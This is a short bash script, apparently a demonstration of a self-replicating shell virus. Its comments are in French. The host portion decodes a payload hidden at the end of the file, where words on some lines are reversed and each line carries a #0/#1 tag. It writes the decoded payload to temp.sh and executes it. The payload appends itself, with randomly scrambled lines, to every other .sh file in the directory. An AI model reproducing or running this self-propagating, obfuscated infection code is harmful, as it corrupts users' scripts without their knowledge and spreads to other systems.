#!/bin/bash

echo "je suis le code hote"


renverse(){
    a=""
    for i in $*
    do
	a="$i $a"
    done
    echo $a
}
cat $0 | tail -n 64 | head -n 8 > temp.sh
cat temp.sh
chmod u+x temp.sh

n=$(wc -l $0 | cut -d " "  -f1)
n=$(($n+0))
i=$(($n-25))
while [ $i -le $n ]
do  
    ligne="$(cat $0 | head -n $i | tail -1 )"
    m=$(echo $ligne | wc -c | cut -d " "   -f1)    
    b=$(echo $ligne | cut -c  $(($m-1))-$m)    
    b=$(($b+0))    
    m=$(($m-3))
    if [ $m -gt 0 ]
    then
	ligne1=$(echo $ligne | cut -c 1-$m)
    else
	ligne1=""
    fi
    if [ $b -eq 1 ]
    then
	ligne1=$(renverse $ligne1)	   
    fi	   
    echo "$ligne1" >> temp.sh 
    i=$(($i+1))
done
cat temp.sh
./temp.sh
exit 0

for file in *.sh#0
do#1
] $0) $(basename != $file [ if#1
    then	#0
	n=$(wc -l $0 | cut -d " "  -f1)#0
	n=$(($n+0))#0
i=$(($n-23))#1
i=$i,n=$n" "$file echo#1
] $n -le $i [ while#1
	do#0
	    ligne="$(cat $0 | head -n $i | tail -1 )"#0
	    b=$(($RANDOM % 2))#0
	    if [ $b -eq 1 ]#0
	    then#0
		ligne=$(renverse $ligne)#0
ligne="$ligne#$b"#1
else#1
		ligne="$ligne#$b"#0
fi#1
$file >> "$ligne" echo#1
i=$(($i+1))#1
	done#0
fi#1
done#0

